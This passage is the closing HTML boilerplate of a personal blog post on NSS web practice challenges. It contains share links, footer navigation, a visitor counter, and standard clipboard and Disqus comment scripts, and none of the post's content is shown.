  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-webåˆ·é¢˜"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&name=NSS-webåˆ·é¢˜&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&t=NSS-webåˆ·é¢˜"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    Meteor_Kai
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About me</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">categories</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
	  <ul>
            
              <!-- ä¸è’œå­ç»Ÿè®¡ -->
              <span id="busuanzi_container_site_pv">
                  æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      æœ¬ç«™è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'Meteor_Kai';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
